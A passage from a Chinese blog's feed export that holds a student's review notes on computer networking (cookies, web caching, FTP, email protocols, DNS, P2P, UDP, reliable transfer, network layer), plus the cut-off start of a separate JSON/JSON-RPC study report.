class="lazyload"></a></p><p>（2）cookies的4个重要方面</p><ul><li>Cookie头部行在HTTP响应消息中</li><li>Cookie头部行在HTTP请求消息中</li><li>Cookie文件保存在用户主机中并被用户浏览器管理</li><li>Cookie也保存在Web站点的后端数据库</li></ul><p>（3）好处</p><ul><li>身份认证</li><li>虚拟购物车</li><li>推荐广告</li><li>用户会话状态</li></ul><p>（4）Cookies和隐私</p><ul><li>cookies允许网站更加了解你</li><li>你可以提供名字和E-mail给网站</li><li>广告公司通过网站获得信息</li><li>cookie不适合游动用户</li></ul><h3 id="7-Web缓存（代理服务器）"><a href="#7-Web缓存（代理服务器）" class="headerlink" title="7. Web缓存（代理服务器）"></a>7. Web缓存（代理服务器）</h3><h4 id="7-1原理"><a href="#7-1原理" class="headerlink" title="7.1原理"></a>7.1原理</h4><p>（1）流程</p><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/Web%E7%BC%93%E5%AD%98%E5%99%A8.png" data-fancybox="group" data-caption="Web缓存器" class="fancybox"><img alt="Web缓存器" title="Web缓存器" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/Web%E7%BC%93%E5%AD%98%E5%99%A8.png" class="lazyload"></a></p><p>（2）缓存器既是服务器又是客户机</p><h4 id="7-2-好处"><a href="#7-2-好处" class="headerlink" title="7.2 好处"></a>7.2 好处</h4><ul><li>减少客户机请求的响应时间</li><li>减少内部网络与接入链路上的通信量</li><li>能从整体上大大降低因特网上的Web流量</li></ul><h4 id="7-3-缓存器举例"><a href="#7-3-缓存器举例" class="headerlink" title="7.3 缓存器举例"></a>7.3 缓存器举例</h4><ul><li>增加接入链路的带宽（<em>成本高昂</em>）</li><li>安装缓存服务器</li></ul><h4 id="7-4-条件GET方法"><a href="#7-4-条件GET方法" class="headerlink" title="7.4 条件GET方法"></a>7.4 条件GET方法</h4><ul><li>目的：证实缓存器中的对象是否为最新</li><li>验证<ul><li>缓存器：在请求报文中包含对象最后修改时间</li><li>服务器：如果对象是最新的，则响应报文中不包含对象</li></ul></li><li>图示</li></ul><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E6%9D%A1%E4%BB%B6Get%E6%96%B9%E6%B3%95.png" data-fancybox="group" data-caption="条件Get方法" class="fancybox"><img alt="条件Get方法" title="条件Get方法" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E6%9D%A1%E4%BB%B6Get%E6%96%B9%E6%B3%95.png" class="lazyload"></a></p><h3 id="8-文件传输协议-FTP"><a href="#8-文件传输协议-FTP" class="headerlink" title="8. 文件传输协议 FTP"></a>8. 文件传输协议 FTP</h3><p>（1）client/server模式</p><p>（2）</p><p>控制连接端口号是21</p><p>数据连接端口号是20</p><p>（3）流程</p><p>（4）带外（HTTP是带内）</p><p>（5）无状态（HTTP是有状态）</p><p>（6）常见命令</p><p>（7）常见应答</p><p>（8）数据连接建立模式</p><ul><li>主动模式（服务器去找客户端）</li><li>被动模式（客户端去找服务器）</li></ul><p>（9）数据传输的模式</p><ul><li>ASCII模式</li><li>二进制模式</li></ul><h3 id="9-SMTP协议"><a href="#9-SMTP协议" class="headerlink" title="9. SMTP协议"></a>9. SMTP协议</h3><p>用于电子邮件</p><p>####9.1 三个主要组成部分</p><ul><li>用户代理</li><li>邮件协议</li><li>邮件服务器</li></ul><h4 id="9-2-用户代理"><a href="#9-2-用户代理" class="headerlink" title="9.2 用户代理"></a>9.2 用户代理</h4><ul><li>允许用户阅读、回复、转发、保存、编辑邮件消息</li><li>发送/接收邮件消息到/从服务器</li><li>运行邮件协议</li></ul><h4 id="9-3-邮件服务器"><a href="#9-3-邮件服务器" class="headerlink" title="9.3 邮件服务器"></a>9.3 邮件服务器</h4><ul><li>用<em>邮箱</em>存放用户接收的邮件消息</li><li>外出报文队列</li><li>运行邮件协议</li></ul><h4 id="9-4-邮件协议"><a href="#9-4-邮件协议" class="headerlink" title="9.4 邮件协议"></a>9.4 邮件协议</h4><ul><li>邮件发送协议SMTP<ul><li>服务器端口号：25</li><li>直接传送：发送服务器直接到接收服务器</li><li>握手-&gt;传输邮件消息-&gt;结束</li><li>命令和应答都是ASCII码</li><li>邮件消息必须是7-bit ASCII</li></ul></li><li>邮件接收协议</li><li>与HTTP的比较<ul><li>HTTP是拉协议，SMTP是推协议</li><li>都有ASCII命令/应答交互，状态码</li></ul></li></ul><h3 id="10-邮件报文格式和MIME"><a href="#10-邮件报文格式和MIME" class="headerlink" title="10.邮件报文格式和MIME"></a>10.邮件报文格式和MIME</h3><h4 id="10-1-邮件消息的格式"><a href="#10-1-邮件消息的格式" class="headerlink" title="10.1 邮件消息的格式"></a>10.1 邮件消息的格式</h4><ul><li>信头-头部行<ul><li>TO</li><li>FROM</li><li>Subject</li></ul></li><li>空行</li><li>信体</li></ul><h4 id="10-2-多媒体扩展MIME"><a href="#10-2-多媒体扩展MIME" class="headerlink" title="10.2 多媒体扩展MIME"></a>10.2 多媒体扩展MIME</h4><p>（1）多用途因特网邮件扩展</p><p>（2）还可以发音频、文件等</p><p>（3）通过添加额外的头部行来实现</p><ul><li>mine版本</li><li>同来编码数据的方法</li><li>类型名，子类型名，参数声明</li></ul><h4 id="10-3-示例：使用SMTP发送带头部的电子邮件"><a href="#10-3-示例：使用SMTP发送带头部的电子邮件" class="headerlink" title="10.3 示例：使用SMTP发送带头部的电子邮件"></a>10.3 示例：使用SMTP发送带头部的电子邮件</h4><h3 id="11-邮件访问协议"><a href="#11-邮件访问协议" class="headerlink" title="11.邮件访问协议"></a>11.邮件访问协议</h3><ul><li>POP协议</li><li>IMAP</li><li>HTTP</li></ul><h4 id="11-1POP3协议"><a href="#11-1POP3协议" class="headerlink" title="11.1POP3协议"></a>11.1POP3协议</h4><ul><li>授权<ul><li>客户端命令<ul><li>user username</li><li>pass password</li></ul></li><li>服务器响应<ul><li>+OK</li><li>-ERR</li></ul></li></ul></li><li>事务处理<ul><li>客户端命令<ul><li>list</li><li>retr</li><li>dele</li><li>quit</li></ul></li></ul></li><li>更新<a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/POP3.png" data-fancybox="group" data-caption="POP3" class="fancybox"><img alt="POP3" title="POP3" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/POP3.png" class="lazyload"></a></li></ul><h4 id="11-2-POP3和IMAP"><a href="#11-2-POP3和IMAP" class="headerlink" title="11.2 POP3和IMAP"></a>11.2 POP3和IMAP</h4><p>POP3:</p><ul><li>POP3的会话是无状态的</li><li>“Download and keep”</li></ul><p>IMAP：</p><ul><li>保存所有邮件消息在一个位置：服务器</li><li>允许用户在服务器的各文件夹中管理邮件消息</li><li>IMAP维护用户会话的状态信息</li></ul><h3 id="12-DNS体系介绍"><a href="#12-DNS体系介绍" class="headerlink" title="12.DNS体系介绍"></a>12.DNS体系介绍</h3><p>DNS：域名系统</p><p>IP地址：数字</p><p>主机名：用于人记忆方便</p><p>要在IP地址与主机名之间进行转换</p><h4 id="12-1-DNS服务器的功能"><a href="#12-1-DNS服务器的功能" class="headerlink" title="12.1 DNS服务器的功能"></a>12.1 DNS服务器的功能</h4><ul><li>主机名到IP地址的转换</li><li>主机别名</li><li>邮件服务器别名</li><li>负载分配</li></ul><h4 id="12-2-DNS特点"><a href="#12-2-DNS特点" class="headerlink" title="12.2 DNS特点"></a>12.2 DNS特点</h4><ul><li>分布式数据库</li><li>应用层协议</li></ul><h4 id="12-3-体系结构"><a href="#12-3-体系结构" class="headerlink" title="12.3 体系结构"></a>12.3 体系结构</h4><ul><li>根域名服务器</li><li>顶级域名服务器<ul><li>com, org,net,edu</li><li>uk,fr,jp,cn</li></ul></li><li>权威域名服务器</li><li>本地DNS服务器（严格来说不属于体系结构中的）</li></ul><h3 id="13-DNS工作机理"><a href="#13-DNS工作机理" class="headerlink" title="13.DNS工作机理"></a>13.DNS工作机理</h3><ul><li>递归查询<ul><li>根域名服务器负担较重</li></ul></li></ul><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2.png" data-fancybox="group" data-caption="递归查询" class="fancybox"><img alt="递归查询" title="递归查询" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2.png" class="lazyload"></a></p><ul><li>迭代查询</li></ul><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2.png" data-fancybox="group" data-caption="迭代查询" class="fancybox"><img alt="迭代查询" title="迭代查询" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2.png" class="lazyload"></a></p><h4 id="13-1-DNS缓存和权威DNS记录更新"><a href="#13-1-DNS缓存和权威DNS记录更新" class="headerlink" title="13.1 DNS缓存和权威DNS记录更新"></a>13.1 DNS缓存和权威DNS记录更新</h4><ul><li>一旦名字服务器获得DNS映射，它将缓存该映射到局部内存</li><li>TTL后才丢弃</li><li>缓存的条目可能已经过期</li></ul><h4 id="13-2-DNS记录"><a href="#13-2-DNS记录" class="headerlink" title="13.2 DNS记录"></a>13.2 DNS记录</h4><p>DNS：存储资源记录（RR，Resource Records）的分布式数据库</p><p>RR格式：（name，value，type，TTL）</p><ul><li>Type = A<ul><li>name = 主机名</li><li>value = IP地址</li></ul></li><li>Type = CNAME<ul><li>name = 主机别名</li><li>value = 真实的规范主机名</li></ul></li><li>Type = NS（name server）<ul><li>name = 域名</li><li>value = 该域权威名字服务器的主机名</li></ul></li><li>Type = MX（mail exchange）<ul><li>name = 邮件服务器的主机别名</li><li>value = 邮件服务器的真实规范主机名</li></ul></li></ul><h4 id="13-3-DNS协议，消息"><a href="#13-3-DNS协议，消息" class="headerlink" title="13.3 DNS协议，消息"></a>13.3 DNS协议，消息</h4><ul><li>DNS协议的报文格式（发送协议和接收协议格式一样）</li><li>格式</li></ul><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/DNS%E5%8D%8F%E8%AE%AE.png" data-fancybox="group" data-caption="DNS协议" class="fancybox"><img alt="DNS协议" title="DNS协议" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/DNS%E5%8D%8F%E8%AE%AE.png" class="lazyload"></a></p><h4 id="13-4-在DNS数据库中插入记录"><a href="#13-4-在DNS数据库中插入记录" class="headerlink" title="13.4 在DNS数据库中插入记录"></a>13.4 在DNS数据库中插入记录</h4><ul><li>NS</li><li>A（网站）</li></ul><h4 id="13-5-DNS安全问题"><a href="#13-5-DNS安全问题" class="headerlink" title="13.5 DNS安全问题"></a>13.5 DNS安全问题</h4><ul><li>DDos</li><li>DNS amplification attacks</li><li>个人用户安全问题</li></ul><h3 id="14-P2P应用（了解即可）"><a href="#14-P2P应用（了解即可）" class="headerlink" title="14. P2P应用（了解即可）"></a>14. P2P应用（了解即可）</h3><h4 id="14-1-分类"><a href="#14-1-分类" class="headerlink" title="14.1 分类"></a>14.1 分类</h4><ul><li>纯P2P架构</li><li>集中式目录架构</li></ul><h4 id="14-2-P2P技术"><a href="#14-2-P2P技术" class="headerlink" title="14.2 P2P技术"></a>14.2 P2P技术</h4><ul><li>查询洪泛</li><li>KaZaA</li><li>P2P文件分发-BitTorrent<ul><li>追踪器tracker</li><li>请求文件块</li><li>发送文件块：tit-for-tat（一报还一报）</li></ul></li><li>DHT：一个分布式的P2P数据库<ul><li>键值对</li><li>一个对等方利用key来查询DHT，返回匹配的value</li><li>对等方还可以插入（key，value）对</li><li>如何分配键值对给对等方？<ul><li>把每个key转化成一个整数</li><li>把每个对等方分配一个整数标识符</li><li>把键值对分配给离key最近的那个对等方<ul><li>标识符由n比特构成</li><li>需要每个key也在同样的范围内</li><li>key = hash（”Led Zeppelin IV”）</li><li>直接后继</li></ul></li></ul></li><li>查询复杂度是O(n)</li></ul></li></ul><ul><li>带捷径的环形DHT<ul><li>查询复杂度是O(log N)</li></ul></li></ul><h3 id="15-TCP和UDP套接字编程"><a href="#15-TCP和UDP套接字编程" class="headerlink" title="15. TCP和UDP套接字编程"></a>15. TCP和UDP套接字编程</h3><ul><li>socket API<ul><li>TCP编程</li><li>UDP编程</li></ul></li></ul><h2 id="第三章-运输层"><a href="#第三章-运输层" class="headerlink" title="第三章 运输层"></a>第三章 运输层</h2><h3 id="1-传输层服务"><a href="#1-传输层服务" class="headerlink" title="1. 传输层服务"></a>1. 传输层服务</h3><p>在两个不同的主机上运行的应用程序之间提供逻辑通信</p><p>####1.1传输层协议运行在端系统</p><ul><li>发送方：将应用程序报文分成数据段传递给网络层</li><li>接收方：将数据段重新组装成报文传递给应用层</li></ul><h4 id="1-2-Internet传输层协议"><a href="#1-2-Internet传输层协议" class="headerlink" title="1.2 Internet传输层协议"></a>1.2 Internet传输层协议</h4><ul><li>TCP</li><li>UDP</li></ul><h4 id="1-3-传输层和网络层"><a href="#1-3-传输层和网络层" class="headerlink" title="1.3 传输层和网络层"></a>1.3 传输层和网络层</h4><ul><li>网络层：两个主机之间的逻辑通信</li><li>传输层：两个进程之间的逻辑通信</li></ul><h3 id="2-多路复用和多路分解"><a href="#2-多路复用和多路分解" class="headerlink" title="2. 多路复用和多路分解"></a>2. 多路复用和多路分解</h3><p>（1）<a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8E%E5%A4%9A%E8%B7%AF%E5%88%86%E8%A7%A3.png" data-fancybox="group" data-caption="多路复用与多路分解" class="fancybox"><img alt="多路复用与多路分解" title="多路复用与多路分解" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8E%E5%A4%9A%E8%B7%AF%E5%88%86%E8%A7%A3.png" class="lazyload"></a></p><p>（2）</p><ul><li>在接收主机多路分解</li><li>在发送主机多路复用</li></ul><h4 id="2-1-无连接多路分解"><a href="#2-1-无连接多路分解" class="headerlink" title="2.1 无连接多路分解"></a>2.1 无连接多路分解</h4><ul><li>用端口号创建套接字<ul><li>UDP 套接字由两个因素指定:目的IP地址, 目的端口号</li></ul></li><li>当主机收到UDP数据段<ul><li>检查数据段中的目的端口号</li><li>用端口号指示UDP数据段属于哪个套接字</li></ul></li><li>具有不同的源IP地址且/或源端口号，但具有相同的目的IP地址和目的端口号的IP数据报指向同样的套接字</li></ul><h4 id="2-2-面向连接的多路分解"><a href="#2-2-面向连接的多路分解" class="headerlink" title="2.2 面向连接的多路分解"></a>2.2 面向连接的多路分解</h4><p>（1）TCP套接字由4部分指定</p><ul><li>源IP地址</li><li>源端口号</li><li>目的IP地址</li><li>目的端口号</li></ul><p>接收主机使用所有四个值将数据段定位到合适的套接字</p><p>（2）非持久HTTP将对每个请求有一个不同的套接字</p><h3 id="3-无连接传输：UDP"><a href="#3-无连接传输：UDP" class="headerlink" title="3. 无连接传输：UDP"></a>3. 无连接传输：UDP</h3><h4 id="3-1-特点"><a href="#3-1-特点" class="headerlink" title="3.1 特点"></a>3.1 特点</h4><ul><li>无修饰</li><li>不加渲染</li><li>尽最大努力</li><li>无连接（没有握手）</li></ul><h4 id="3-2-优点"><a href="#3-2-优点" class="headerlink" title="3.2 优点"></a>3.2 优点</h4><ul><li><p>无连接：发送数据之前不需要建立连接</p></li><li><p>尽最大努力：不保证可靠交付，也不使用拥塞控制（很符合多媒体通信的要求）</p></li><li><p>支持一对一、一对多、多对一、多对多的交互通信</p></li><li><p>首部开销小，只有8个字节</p></li><li><p><strong>面向报文</strong></p><ul><li>发送发UDP对应用程序交下来的报文，在添加首部后就向下交付IP层</li><li>UDP对应用层发下来的报文，既不合并，也不拆分，而是保留这些报文的边界。</li><li>应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文</li><li>接收方UDP对IP层交上来的UDP用户数据报，在去除首部后就原封不动地交付上层的应用进程，一次交付一个完整的报文。</li></ul><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/UDP.png" data-fancybox="group" data-caption="UDP" class="fancybox"><img alt="UDP" title="UDP" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/UDP.png" class="lazyload"></a></p></li></ul><h4 id="3-3-用户数据报UDP的格式"><a href="#3-3-用户数据报UDP的格式" class="headerlink" title="3.3 用户数据报UDP的格式"></a>3.3 用户数据报UDP的格式</h4><p>（1）用户数据报</p><ul><li>数据字段</li><li>首部字段</li></ul><p>（2）首部字段</p><p>源端口 目的端口 长度 检验和</p><p>（2bit）（2bit）（2bit）（2bit）</p><h4 id="3-4-校验和"><a href="#3-4-校验和" class="headerlink" title="3.4 校验和"></a>3.4 校验和</h4><p>（1）在计算校验和时，临时把伪首部和UDP用户数据报连接在一起。伪首部仅仅是为了计算校验和。</p><p>![屏幕快照 2019-06-18 下午3.26.03](/Users/chenxiaoyu/Desktop/计网复习/PPT里的图片/屏幕快照 2019-06-18 下午3.26.03.png)</p><p>（2）差错检测流程图</p><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E5%B7%AE%E9%94%99%E6%A3%80%E9%AA%8C.png" data-fancybox="group" data-caption="差错检验" class="fancybox"><img alt="差错检验" title="差错检验" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E5%B7%AE%E9%94%99%E6%A3%80%E9%AA%8C.png" class="lazyload"></a></p><p>（3）算法</p><ul><li>发送方<ul><li>将数据段看成16bit的整数序列，校验和：数据段内容相加（1的补码和），发送者将校验值放入UDP的校验和域</li></ul></li><li>接收方<ul><li>计算接收到数据段的校验和，检查计算的校验和是否等于校验和域中的值</li><li>但是可能是错误的</li></ul></li></ul><p>（4）例子![屏幕快照 2019-06-18 下午3.28.36](/Users/chenxiaoyu/Desktop/计网复习/PPT里的图片/屏幕快照 2019-06-18 下午3.28.36.png)</p><p>求和-&gt;回卷-&gt;变反-&gt;得到校验和</p><p>通过校验和来检测差错</p><h3 id="4-可靠数据传输原理"><a href="#4-可靠数据传输原理" class="headerlink" title="4. 可靠数据传输原理"></a>4. 可靠数据传输原理</h3><ul><li>首部字段Rdt1.0<ul><li>在完美可靠的信道上</li><li>发送方、接收方分离的FSMs</li></ul></li><li>Rdt2.0<ul><li>具有bit错误的信道<ul><li>ACKs</li><li>NAKs</li></ul></li><li>新机制<ul><li>差错检测</li><li>接收方反馈</li></ul></li><li>停-等协议</li><li>致命缺陷——发送方并不知道接收方发生了什么<ul><li>发送方给每个分组加一个序号</li><li>在ACK/NAK混淆时发送方重发当前分组</li><li>接收方丢弃重复的分组（并不向上传递）</li></ul></li></ul></li><li>Rdt2.1<ul><li>加入序列号</li><li>状态加倍</li></ul></li><li>Rdt2.2<ul><li>不要NAK</li><li>发送方收到重复ACK将导致和NAK一样的处理</li></ul></li><li>Rdt3.0<ul><li>具有出错和丢失</li><li>加入定时器</li><li>能工作但是性能很差（因为停等协议）</li></ul></li><li>流水线技术<ul><li>发送方允许发送多个”在路上的”，还没有确认的报文</li><li>序号数目的范围必须增加</li><li>在发送方/接收方必须有缓冲区</li><li>增加了利用率</li><li>两个通用模式<ul><li>go-Back-N</li><li>选择重传</li></ul></li></ul></li></ul><h3 id="5-面向连接传输：TCP"><a href="#5-面向连接传输：TCP" class="headerlink" title="5. 面向连接传输：TCP"></a>5. 面向连接传输：TCP</h3><h3 id="6-拥塞控制原理"><a href="#6-拥塞控制原理" class="headerlink" title="6. 拥塞控制原理"></a>6. 拥塞控制原理</h3><h3 id="7-TCP拥塞控制"><a href="#7-TCP拥塞控制" class="headerlink" title="7. TCP拥塞控制"></a>7. TCP拥塞控制</h3><h2 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h2><h3 id="4-1-引言"><a href="#4-1-引言" class="headerlink" title="4.1 引言"></a>4.1 引言</h3><h4 id="1-网络层提供的功能"><a href="#1-网络层提供的功能" class="headerlink" title="1.网络层提供的功能"></a>1.网络层提供的功能</h4><ul><li>发送方主机传输报文段到接收方主机</li><li>发送方主机封装报文段为数据报</li><li>接收方主机递交报文段给传输层</li><li>在每个主机、路由器上都需要运行网络层协议</li><li>路由器会检查通过它的所有IP数据报的头部字段，然后根据目的IP地址对数据报进行转发</li></ul><h4 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2.主要功能"></a>2.主要功能</h4><ul><li>转发：将分组从路由器的输入端口转移到正确的路由器输出端口</li><li>路由：确定分组从发送方传输到接收方(目的主机)所经过的路径(或路由)</li></ul><p>路由是全局概念，转发是局部的。</p><h4 id="3-连接建立"><a href="#3-连接建立" class="headerlink" title="3.连接建立"></a>3.连接建立</h4><h4 id="4-网络层的服务模型"><a href="#4-网络层的服务模型" class="headerlink" title="4.网络层的服务模型"></a>4.网络层的服务模型</h4><p>（1）网络层可能提供的服务</p><ul><li>确保交付：确保分组到达目的地。</li><li>具有时延上界的确保交付：主机到主机的时延。</li><li>有序分组交付：按发送顺序到达。</li><li>确保最小带宽：当发送主机以低于特定比特率的速率发送比特，分组不会丢失，在一定时延到达。</li><li>确保最大时延抖动：发送方发送两个连续分组的时间间隔与接收到的间隔相同。</li></ul><p>（2）因特网的网络层提供的服务</p><ul><li>单一服务，即尽力而为服务(best-effort service) 。</li><li>分组间的定时不能被保证；</li><li>分组的接收顺序与发送顺序不一定相同；</li><li>传送的分组不能保证最终交付，即网络可能未向目的地交付分组。</li></ul><h3 id="4-2-虚电路和数据报网络"><a href="#4-2-虚电路和数据报网络" class="headerlink" title="4.2 虚电路和数据报网络"></a>4.2 虚电路和数据报网络</h3><h4 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h4><ul><li>数据报——无连接服务</li><li>虚电路——连接服务</li></ul><p>只提供两种服务之一，不会同时提供。</p><ul><li>传输层：面向连接服务在网络边缘的端系统中实现</li><li>网络层：面向连接服务在端系统及网络核心的路由器中实现</li></ul><h4 id="2-虚电路"><a href="#2-虚电路" class="headerlink" title="2.虚电路"></a>2.虚电路</h4><ul><li>源主机-目的主机路径的行为类似于电话网络的行为</li><li>一条虚电路包括：<ul><li>一条从发送方到接收方的路径</li><li>VC号，沿路径的每条链路都有一个VC号</li><li>沿路径的每个路由器上都有转发表条目</li></ul></li><li>虚电路的信令协议<ul><li>建立</li><li>维护</li><li>拆除</li></ul></li></ul><h4 id="4-数据报网络（现在用）"><a href="#4-数据报网络（现在用）" class="headerlink" title="4. 数据报网络（现在用）"></a>4. 数据报网络（现在用）</h4><p>（1）特点</p><ul><li>在网络层无呼叫的过程</li><li>路由器：不需要维护端到端连接的状态</li><li>没有网络等级的”连接”的概念</li><li>使用目的主机的地址进行分组转发</li></ul><p>（2）数据报转发表</p><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E6%95%B0%E6%8D%AE%E6%8A%A5%E8%BD%AC%E5%8F%91%E8%A1%A8.png" data-fancybox="group" data-caption="数据报转发表" class="fancybox"><img alt="数据报转发表" title="数据报转发表" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/%E6%95%B0%E6%8D%AE%E6%8A%A5%E8%BD%AC%E5%8F%91%E8%A1%A8.png" class="lazyload"></a></p><p>（3）最长前缀匹配</p><p>对于给定的目的地址，使用最长地址前缀匹配来完成输出端口的查找。</p><p>（4）路由器查表方法</p><p>用目的地址前缀与转发表的前缀匹配</p><ul><li>存在匹配：向对应链路转发</li><li>不存在匹配：选择”其他”项对应的链路转发</li><li>存在多个匹配：”最长前缀匹配规则”</li></ul><p>（5）特点</p><ul><li>虚电路：<ul><li>网络功能复杂</li><li>端系统设备简单</li><li>e.g.ATM</li></ul></li><li>数据报：<ul><li>网络层服务模型简单</li><li>端系统功能复杂</li><li>提供的服务保证最少</li><li>e.g.因特网</li></ul></li></ul><h3 id="4-3-路由器的工作原理"><a href="#4-3-路由器的工作原理" class="headerlink" title="4.3 路由器的工作原理"></a>4.3 路由器的工作原理</h3><h4 id="1-路由器的核心功能"><a href="#1-路由器的核心功能" class="headerlink" title="1.路由器的核心功能"></a>1.路由器的核心功能</h4><ul><li>运行路由算法/协议</li><li>将分组从路由器的输入链路传送到正确的输出链路</li></ul><h4 id="2-路由器的体系结构"><a href="#2-路由器的体系结构" class="headerlink" title="2.路由器的体系结构"></a>2.路由器的体系结构</h4><ul><li>输入端口<ul><li>线性端接模块</li><li>数据链路处理模块</li><li>查找与转发模块</li></ul></li><li>输出端口</li><li>交换结构</li><li>选路处理器</li></ul><h3 id="4-4-IP协议（重点）"><a href="#4-4-IP协议（重点）" class="headerlink" title="4.4 IP协议（重点）"></a>4.4 IP协议（重点）</h3><h3 id="4-5-路由算法（重点难点）"><a href="#4-5-路由算法（重点难点）" class="headerlink" title="4.5 路由算法（重点难点）"></a>4.5 路由算法（重点难点）</h3><h3 id="4-6-因特网中的路由协议"><a href="#4-6-因特网中的路由协议" class="headerlink" title="4.6 因特网中的路由协议"></a>4.6 因特网中的路由协议</h3>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON/JSON-RPC学习报告</title>
      <link href="/post/ba3b3412.html"/>
      <url>/post/ba3b3412.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="JSON-amp-JSON-RPC学习报告-2019091602014-冯新越"><a href="#JSON-amp-JSON-RPC学习报告-2019091602014-冯新越" class="headerlink" title="JSON&amp;JSON-RPC学习报告-2019091602014-冯新越"></a>JSON&amp;JSON-RPC学习报告-2019091602014-冯新越</h1><h1 id="JSON部分"><a href="#JSON部分" class="headerlink" title="JSON部分"></a>JSON部分</h1><h2 id="什么是JSON"><a href="#什么是JSON" class="headerlink" title="什么是JSON"></a>什么是JSON</h2><p><strong>JSON</strong> : JavaScript Object Notation(JavaScript 对象表示法)</p><ul><li>JSON是一种<strong>存储和交换文本信息的语法</strong>，类似于XML但是更小、更快，更易解析。</li><li>JSON是<strong>独立于语言和平台的</strong>文本数据交换格式。JSON解析器/库支持许多不同的编程语言，多数动态编程语言都支持JSON。</li><li>JSON是<strong>具有自我描述性</strong>的语法，易于理解，也方便机器进行解析和生成。</li></ul><h2 id="JSON与XML的横向对比"><a href="#JSON与XML的横向对比" class="headerlink" title="JSON与XML的横向对比"></a>JSON与XML的横向对比</h2><p>JSON | XML<br>|-:|:-|<br>相同 |都是纯文本、都具有自我描述性、都具有层级结构、都可通过JavaScript解析、都可使用AJAX进行数据传输<br>不同 |JSON没有结束标签、更简短且读写更快、能够使用内建的JavaScript eval()方法进行解析、能使用数组、不使用保留字</p><hr><ul><li>相对于XML语言来说，我们不难看出，JSON具有无可比拟的优越性。<br>  它的简便、轻量、易于维护，繁多的功能支持让他逐渐在Web Service中占据一席之地。</li><li>但是相较于XML，JSON并没有它推广的这么深入人心和广泛使用, 